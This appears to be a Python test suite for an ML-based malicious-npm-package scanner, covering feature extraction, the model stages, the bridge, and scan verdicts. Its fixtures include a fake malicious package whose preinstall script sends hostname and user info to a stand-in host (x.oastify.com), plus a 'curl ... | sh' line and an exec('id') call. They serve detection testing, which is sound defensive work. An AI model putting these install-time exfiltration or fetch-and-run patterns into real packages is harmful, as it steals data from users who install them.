"""AegisPilot ML for npm (2026-11-15): npm features (package.json, install scripts, JavaScript, registry history), the same
numbers from a tarball and from the guard's unpacked folder, the time budget, the two stages with npm's lists, the
bridge (no npm model -> rules alone, silently), scan.py run as the guard runs it, and the npm scan using the result.
Offline. run: python3 tests/test_ml_npm.py"""
import datetime
import gzip
import hashlib
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
GUARD = ROOT / "guard"
ML = GUARD / "ml"
sys.path.insert(0, str(GUARD))
sys.path.insert(0, str(ML))
import forest  # noqa: E402
import npm_features as NF  # noqa: E402
import js_code_features as JS  # noqa: E402

UTC = datetime.timezone.utc


def tgz(files, prefix="package/"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, text in files.items():
            data = text if isinstance(text, bytes) else text.encode()
            ti = tarfile.TarInfo(prefix + name)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def unpack(data, dest):
    with tarfile.open(fileobj=io.BytesIO(data)) as tf:
        tf.extractall(dest, filter="data")


def pj(**kw):
    return json.dumps({"name": "demo", "version": "1.0.0", **kw})


def tree(feature, threshold, p_left, p_right, cover=(10.0, 5.0, 5.0)):
    return {"left": [1, -1, -1], "right": [2, -1, -1], "feature": [feature, -1, -1], "threshold": [threshold, 0.0, 0.0],
            "p1": [(p_left * cover[1] + p_right * cover[2]) / cover[0], p_left, p_right], "cover": list(cover)}


def forest_json(features, trees, alert, review, log_features=()):
    return {"format": forest.FORMAT, "features": list(features), "log_features": list(log_features),
            "thresholds": {"alert": alert, "review": review}, "trees": trees}


def gz(d):
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as g:
        g.write(json.dumps(d).encode())
    return buf.getvalue()


MALICIOUS = {
    "package.json": pj(scripts={"preinstall": "node index.js"}),
    "index.js": "const https = require('https');\nconst os = require('os');\n"
                "const d = JSON.stringify({h: os.hostname(), u: os.userInfo()});\n"
                "https.request({host: 'x.oastify.com', method: 'POST'}).end(d);\n",
}
LIBRARY = {
    "package.json": pj(description="An HTTP helper", license="MIT", repository="github:a/b", keywords=["http"],
                       dependencies={"debug": "^4"}),
    "README.md": "# demo\n",
    "lib/index.js": "const https = require('https');\nconst cp = require('child_process');\n"
                    "/* https.get(url) in a comment does not count */\n"
                    "function get(url) { return new Promise(r => https.get(url, r)); }\n"
                    "function run(c) { return cp.execSync(c); }\n"
                    "const re = /a/; re.exec('a');\nmodule.exports = { get, run };\n",
}


class Features(unittest.TestCase):
    def test_install_time_code(self):
        r = NF.compute(JS.iter_archive(tgz(MALICIOUS)))["raw"]
        self.assertEqual(r["has_install_script"], 1)
        self.assertEqual((r["install_network"], r["install_process"]), (1, 0))
        self.assertEqual(r["auto_network"], 1)               # the request call, not the require
        self.assertEqual(r["recon_cnt"], 2)
        self.assertEqual(r["author_empty"], 1)

    def test_library_top_level_and_functions(self):
        r = NF.compute(JS.iter_archive(tgz(LIBRARY)))["raw"]
        self.assertEqual(r["has_install_script"], 0)
        self.assertEqual((r["auto_network"], r["auto_process"]), (0, 0))   # calls inside functions; requires alone
        self.assertEqual(r["process_cnt"], 2)                # the child_process require + execSync, not RegExp#exec
        self.assertEqual(r["network_cnt"], 2)                # require('https') + https.get (the comment is gone)
        self.assertEqual((r["has_readme"], r["has_home"], r["has_license"], r["n_deps"], r["n_keywords"]), (1, 1, 1, 1, 1))

    def test_iife_runs_at_load(self):
        files = {"package.json": pj(), "index.js": "(function(){ require('child_process').exec('id'); })();\n"}
        self.assertEqual(NF.compute(JS.iter_archive(tgz(files)))["raw"]["auto_process"], 1)

    def test_archive_and_unpacked_folder_agree(self):
        """Training reads tarballs and sample zips, the guard its unpacked folder: the same numbers."""
        data = tgz({**LIBRARY, **{"bin/x.sh": "curl http://e/x | sh\n", "img.png": "\x89PNG"}})
        a = NF.compute(JS.iter_archive(data))["raw"]
        with tempfile.TemporaryDirectory() as d:
            root = Path(d) / "demo-1.0.0.tgz.unpacked"
            unpack(data, root)
            (root / "package" / "package.json#postinstall.sh").write_text("x")   # the guard's own lifecycle copies
            b = NF.compute_from_dir(root)["raw"]
        self.assertEqual(a, b)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:                 # a DataDog sample: tmp/xyz/<name>/package/... + package_info
            for n, t in LIBRARY.items():
                z.writestr(f"tmp/x/demo/package/{n}", t)
            z.writestr("tmp/x/demo/package_info-demo-1.0.0.json", json.dumps({"time": {"created": "2025-01-01T00:00:00Z"}}))
        self.assertEqual(NF.compute(JS.iter_archive(buf.getvalue()))["raw"], NF.compute(JS.iter_archive(tgz(LIBRARY)))["raw"])
        self.assertEqual(NF.sample_packument(buf.getvalue())["time"]["created"], "2025-01-01T00:00:00Z")

    def test_bom_and_missing_package_json(self):
        r = NF.compute(JS.iter_archive(tgz({"package.json": "﻿" + pj(), "a.js": "x"})))
        self.assertEqual(r["name"], "demo")
        with self.assertRaises(NF.NoPackageJson):
            NF.compute(JS.iter_archive(tgz({"a.js": "x"})))

    def test_registry_features(self):
        doc = {"time": {"created": "2026-01-01T10:00:00Z", "modified": "2026-03-01T00:00:00Z",
                        "1.0.0": "2026-01-01T10:00:00Z", "1.0.1": "2026-01-05T00:00:00Z", "2.0.0": "2026-02-01T00:00:00Z"},
               "maintainers": [{"name": "a", "email": "a@gmail.com"}, {"name": "b", "email": "b@corp.example"}]}
        now = datetime.datetime(2026, 1, 11, 9, 0, tzinfo=UTC)
        r = NF.registry_features(doc, "1.0.1", now)
        self.assertEqual(r, {"n_versions": 2, "age_days": 9.0, "n_maintainers": 2, "maint_free_email": 1})
        self.assertEqual(NF.found_at("x/2025-11-24-@a_b-v1.0.0.zip"), datetime.datetime(2025, 11, 24, tzinfo=UTC))
        full = NF.compute(JS.iter_archive(tgz(MALICIOUS)), doc, "1.0.0", now)
        self.assertTrue(full["registry_ok"])
        self.assertEqual(set(NF.NPM_FEATURES) - set(full["raw"]), set())

    def test_budget_reads_install_code_first(self):
        saved = JS.ANALYZE_BUDGET
        JS.ANALYZE_BUDGET = 200
        try:
            big = "var a = 1;\n" * 100 + "eval(x);\n"                         # past the budget: only measured
            files = {"package.json": pj(scripts={"postinstall": "node setup.js"}), "setup.js": big,
                     "small.js": "fetch('http://x');\n"}
            r = NF.compute(JS.iter_archive(tgz(files)))["raw"]
        finally:
            JS.ANALYZE_BUDGET = saved
        self.assertEqual(r["install_exec"], 1)                # the install file is always read in full
        self.assertEqual(r["n_js"], 2)
        self.assertEqual(r["auto_network"], 1)

    def test_no_third_party_imports(self):
        import ast
        allowed = set(sys.stdlib_module_names) | {"js_code_features", "code_features", "npm_features", "features", "forest"}
        for name in ("npm_features.py", "js_code_features.py"):
            for node in ast.walk(ast.parse((ML / name).read_text())):
                mods = [a.name for a in node.names] if isinstance(node, ast.Import) else \
                    [node.module] if isinstance(node, ast.ImportFrom) and node.module else []
                for m in mods:
                    self.assertIn(m.split(".")[0], allowed, f"{name}: {m}")


class TwoStages(unittest.TestCase):
    def setUp(self):
        import scan
        self.scan = scan
        self.saved = dict(scan._cache)
        self.tmp = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.scan._cache.clear()
        self.scan._cache.update(self.saved)
        self.tmp.cleanup()

    def run_npm(self, files, kind="npm_pkg", packument=None):
        feats = ["n_js", "n_deps", "install_network", "network_cnt"]
        # any JavaScript -> 0.9; network code raises it a little more
        self.scan._cache[kind] = forest.Forest(forest_json(feats, [tree(0, 0.5, 0.0, 0.9), tree(3, 0.5, 0.85, 0.95)], 0.3, 0.3))
        root = Path(self.tmp.name) / "p.tgz.unpacked"
        shutil.rmtree(root, ignore_errors=True)
        unpack(tgz(files), root)
        pp = None
        if packument:
            pp = Path(self.tmp.name) / "doc.json"
            pp.write_text(json.dumps(packument))
        return self.scan.scan_npm("demo", "1.0.0", str(root), pp, offline=True)

    def test_severe_is_review_and_said_in_npm_words(self):
        r = self.run_npm(MALICIOUS)
        self.assertEqual((r["model"], r["level"], r["ecosystem"]), ("ml_npm_pkg", "review", "npm"))
        why = [t["desc"] for t in r["reasons"]["code_behavior"]]
        self.assertIn("code run at install goes online", why)

    def test_no_behavior_is_note(self):
        r = self.run_npm({"package.json": pj(), "index.js": "module.exports = 1;\n"})
        self.assertEqual(r["level"], "note")

    def test_without_npm_pkg_no_registry_is_skipped_quietly(self):
        """A release with npm_full alone: no registry document -> no ML verdict, and no '[ML] no verdict' line."""
        saved = self.scan.SPEC
        self.scan.SPEC = {**saved, "npm": {"models": {"npm_full": {"file": "x", "sha256": "0"}}}}
        try:
            root = Path(self.tmp.name) / "s.tgz.unpacked"
            unpack(tgz(MALICIOUS), root)
            r = self.scan.scan_npm("demo", "1.0.0", str(root), offline=True)
        finally:
            self.scan.SPEC = saved
        self.assertTrue(r["skipped"])
        import ml_bridge
        import rule_engine
        import scan_engine as se
        res = ml_bridge._run([sys.executable, "-I", "-c", "import sys; sys.stdout.write(sys.argv[1])", json.dumps(r)])
        self.assertEqual((res["ok"], res.get("skipped")), (False, True))
        f = se.ScanFeatures(name="demo", version="1.0.0", ecosystem="npm")
        f.ml = res
        self.assertFalse(any("[ML" in x for x in rule_engine.score_rules(se.RULESET, f)[2]))

    def test_registry_document_picks_npm_full(self):
        doc = {"time": {"created": "2026-01-01T00:00:00Z", "1.0.0": "2026-01-01T00:00:00Z"}, "maintainers": []}
        r = self.run_npm(MALICIOUS, "npm_full", doc)
        self.assertEqual(r["model"], "ml_npm_full")


class Bridge(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.env = dict(os.environ)
        os.environ["AEGIS_ML_DIR"] = str(Path(self.tmp.name) / "ml")
        os.environ.pop("AEGIS_ML", None)
        import ml_bridge
        import ml_install
        self.b, self.i = ml_bridge, ml_install
        self.spec = ml_install.spec

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self.env)
        self.i.spec = self.spec
        self.tmp.cleanup()

    def test_no_npm_model_is_silent(self):
        self.i.spec = lambda: {"release_url": "https://example.invalid/", "models": {}}
        r = self.b.ml_predict_npm("demo", "1.0.0", self.tmp.name)
        self.assertEqual((r["ok"], r.get("not_installed")), (False, True))
        import rule_engine
        import scan_engine as se
        f = se.ScanFeatures(name="demo", version="1.0.0", ecosystem="npm")
        f.ml = r
        self.assertFalse(any("[ML" in x for x in rule_engine.score_rules(se.RULESET, f)[2]))
        os.environ["AEGIS_ML"] = "0"
        self.assertTrue(self.b.ml_predict_npm("demo", "1.0.0", self.tmp.name).get("disabled"))

    def test_groups_are_separate(self):
        """A failed npm download is remembered for npm only; the PyPI group is untouched."""
        fake = {"release_url": "https://example.invalid/", "models": {"full": {"file": "f", "size": 1, "sha256": "0"}},
                "npm": {"release_url": "https://example.invalid/npm/",
                        "models": {"npm_full": {"file": "n", "size": 1, "sha256": "0"}}}}
        self.i.spec = lambda: fake
        real = self.i._fetch
        self.i._fetch = lambda url, dest, timeout=120: (_ for _ in ()).throw(OSError(f"offline {url}"))
        try:
            why = self.i.auto_install(self.b.ml_dir(), group="npm")
        finally:
            self.i._fetch = real
        self.assertIn("example.invalid/npm/n", why)
        self.assertIsNotNone(self.i.last_auto_failure(self.b.ml_dir(), "npm"))
        self.assertIsNone(self.i.last_auto_failure(self.b.ml_dir(), "pypi"))
        self.assertIn("not installed", self.i.status_npm(self.b.ml_dir()))

    def test_subprocess_end_to_end(self):
        """scan.py --ecosystem npm as the guard runs it (python3 -I), from a copy of guard/ml with an npm block."""
        feats = ["n_js", "install_network"]
        model = gz(forest_json(feats, [tree(1, 0.5, 0.1, 0.95)], 0.5, 0.5))
        d = Path(os.environ["AEGIS_ML_DIR"]) / "models"
        d.mkdir(parents=True)
        (d / "pkg.json.gz").write_bytes(model)
        entry = {"file": "pkg.json.gz", "size": len(model), "sha256": hashlib.sha256(model).hexdigest()}
        spec = {"release_url": "https://example.invalid/", "models": {},
                "npm": {"release_url": "https://example.invalid/", "models": {"npm_pkg": entry}}}
        code = Path(self.tmp.name) / "code"
        shutil.copytree(ML, code, ignore=shutil.ignore_patterns("__pycache__", "models.json"))
        (code / "models.json").write_text(json.dumps(spec))
        root = Path(self.tmp.name) / "demo.tgz.unpacked"
        unpack(tgz(MALICIOUS), root)
        cmd = [sys.executable, "-I", str(code / "scan.py"), "demo", "1.0.0", "--ecosystem", "npm", "--dir", str(root),
               "--offline", "--models", str(d), "--json"]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd=self.tmp.name)
        r = json.loads(p.stdout)
        self.assertEqual((r["model"], r["level"]), ("ml_npm_pkg", "review"), p.stderr)
        self.assertEqual(self.b._result(r)["level"], "review")


class NpmScan(unittest.TestCase):
    def test_ml_review_raises_npm_verdict(self):
        """scan_npm_package hands the unpacked folder to the npm model and uses its result like PyPI's."""
        import scan_engine as se
        from sources import npm
        seen = {}
        saved = (npm.metadata, npm.release_age_hours, npm.fetch, se.query_osv, se._ml_predict_npm)

        def fetch(name, spec, dest, meta=None, info=None):
            root = dest / "demo-1.0.0.tgz.unpacked"
            unpack(tgz({"package.json": pj(), "index.js": "module.exports = 1;\n"}), root)
            info.update(artifact="demo-1.0.0.tgz", skipped=[], root=str(root))
            return "1.0.0", list(root.rglob("*"))

        def ml(name, version, pkg_dir, stop=None):
            seen["dir"] = Path(pkg_dir).is_dir()
            return {"ok": True, "ml_score": 0.8, "ml_score_exact": 0.8, "threshold": 0.3, "review_threshold": 0.3,
                    "alert": True, "level": "review", "model": "ml_npm_full", "code_analyzed": True,
                    "reasons": [{"feature": "auto_exec", "desc": "strings run as code as soon as it is installed or loaded (1)"}],
                    "notes": []}
        npm.metadata = lambda name: {"dist-tags": {"latest": "1.0.0"}, "versions": {"1.0.0": {}}}
        npm.release_age_hours = lambda *a, **k: 1000.0
        npm.fetch = fetch
        se.query_osv = lambda *a, **k: []
        se._ml_predict_npm = ml
        try:
            v = se.scan_npm_package("demo")
        finally:
            npm.metadata, npm.release_age_hours, npm.fetch, se.query_osv, se._ml_predict_npm = saved
        self.assertTrue(seen["dir"])                           # the folder still existed while the model read it
        self.assertEqual(v.verdict, "NEEDS_HUMAN_REVIEW")
        self.assertTrue(any(r.startswith("[ML review]") for r in v.reasons), v.reasons)


if __name__ == "__main__":
    unittest.main()
